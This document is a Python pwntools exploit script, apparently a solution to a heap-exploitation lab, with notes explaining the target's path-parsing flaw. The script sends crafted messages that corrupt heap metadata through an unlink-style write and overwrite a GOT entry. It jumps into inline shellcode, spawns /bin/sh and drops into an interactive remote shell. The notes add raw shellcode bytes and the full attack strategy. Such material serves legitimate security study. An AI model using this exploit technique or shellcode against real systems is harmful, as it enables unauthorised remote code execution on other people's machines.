from pwn import *


def check_success(conn):
    cmd = "uname -a"
    conn.send(cmd)

    if len(conn.recvline()) > 0:
        log.success("GOT A SHELL! :D")
        return True
    else:
        log.failure("Could not get a shell! :(")
        return False


def say(something, conn, message=""):
    # Saying must be 128B in length and must start with FSRD.
    saying = "FSRD " + something + '\x00'*(128-len(something)-5)

    if len(message) > 0:
        log.info("Sending: " + message + ' (' + str(len(saying)) + 'B)')
    else:
        log.info("Sending: " + saying + ' (' + str(len(saying)) + 'B)')

    if len(saying) != 128:
        log.error("Said something not equal to 128B!")

    conn.send(saying)


def main():
    prev_size = p32(0xfffffff8)
    size = p32(0xfffffffc)
    fd = p32(0x0804e11d)
    bk = p32(0x0804d41c - 0x8)  # GOT of write offset by 12B.
    shellcode1 = '\x90'*3 + "\xb8\xa5\xe1\x04\x08\xff\xe0"
    shellcode2 = '\x90'*3 + asm(shellcraft.i386.linux.sh())

    conn = remote("192.168.206.132", 2993)
    say("/ROOT/" + "A"*116 + '/', conn, "First chunk")  # 0x0804e013
    say("ROOT/" + prev_size + size + fd + bk, conn, "Exploit")  # 0x0804e09a
    say(shellcode1 + "/ROOT/", conn, "Shellcode 1")  # Shellcode 1 here 0x0804e11d
    say(shellcode2 + "/ROOT/", conn, "Shellcode 2")  # Shellcode 2 here 0x0804e1a5

    if check_success(conn):
        conn.interactive("SHELL-$ ")


if __name__ == "__main__":
    main()

"""
Notes:
    system @ 0xb7ecffb0

    Shellcode:
        push    0x68732f6e      ; Push a part of "/bin/sh"
        jmp     0x0804e1a5      ; Jump to next chunk
        mov     eax,0x69622f03  ; Push the rest of "/bin/sh" XORed with 3 to avoid null byte.
        xor     eax,0x00000003  ; XOR to restore the last part of "/bin/sh"
        call    0xb7ecffb0      ; Call system

    \x68\x6E\x2F\x73\x68\xE9\xA1\xE1\x04\x08\xB8\x03\x2F\x62\x69\x83\xF0\x03\x50\xE8\xB2\xFF\xEC\xB7

    The check_path function finds the first '/' before 'ROOT' and writes whatever
    is after the last '/' into the space after the first '/' before ROOT.

    /AAAAROOT/BBBBCCCCDDDDEEEE
     ^Write   ^Read

    The function doesn't check if the '/' before 'ROOT' even exists, so it is willing
    to go into uncharted territory to find it.

    Confirmed exploit strategy:
        We can have the first chunk put a '/' at the end, then the next chunk will
        not have a ROOT '/'. This means the ROOT will end up using the first chunk's last '/'
        and we can easily overwrite heap metadata from there.
"""
